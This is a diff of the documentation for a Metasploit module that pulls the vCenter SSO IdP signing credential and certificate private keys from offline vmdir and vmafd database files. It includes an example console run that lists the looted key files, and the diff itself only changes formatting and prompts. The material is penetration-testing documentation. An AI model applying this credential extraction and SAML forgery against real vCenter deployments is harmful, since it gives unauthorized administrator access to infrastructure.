@@ -3,7 +3,7 @@ This module will accept files from a live vCenter appliance or from a vCenter ap
 archive; either or both files can be supplied to the module depending on the situation. The module
 will extract the vCenter SSO IdP signing credential from the vmdir database, which can be used to
 create forged SAML assertions and access the SSO directory as an administrator. The vmafd service
-contains the vCenter certificate store which from which the module will attempt to extract all vmafd
+contains the vCenter certificate store, from which the module will attempt to extract all vmafd
 certificates that also have a corresponding private key. Portions of this module are based on
 information published by Zach Hanley at Horizon3:
 
@@ -30,15 +30,15 @@ value is provided for `VC_IP` the module defaults to assigning the loopback IP `
 7. Do: `dump`
 
 ## Options
-**VMDIR_MDB**
+### VMDIR_MDB
 
 Path to the vmdird MDB database file on the local system. Example: `/tmp/data.mdb`
 
-**VMAFD_DB**
+### VMAFD_DB
 
 Path to the vmafd DB file on the local system. Example: `/tmp/afd.db`
 
-**VC_IP**
+### VC_IP
 
 Optional parameter to set the IPv4 address associated with loot entries made by the module.
 
@@ -61,14 +61,14 @@ If you are extracting from a backup file, target files are available in the foll
 Example run against database files extracted from vCenter appliance version 7.0 Update 3d:
 
 ```
-msf6 > use auxiliary/admin/vmware/vcenter_offline_mdb_extract
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmdir_mdb /tmp/data.mdb
+msf > use auxiliary/admin/vmware/vcenter_offline_mdb_extract
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmdir_mdb /tmp/data.mdb
 vmdir_mdb => /tmp/data.mdb
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmafd_db /tmp/afd.db
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmafd_db /tmp/afd.db
 vmafd_db => /tmp/afd.db
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vc_ip 192.168.100.70
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vc_ip 192.168.100.70
 vc_ip => 192.168.100.70
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > dump
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > dump
 
 [*] Extracting vmwSTSTenantCredential from /tmp/data.mdb ...
 [+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_idp_571080.key
@@ -94,5 +94,5 @@ msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > dump
 [+] WCP key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_WCP_057402.key
 [+] WCP cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_WCP_909204.pem
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > 
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > 
 ```
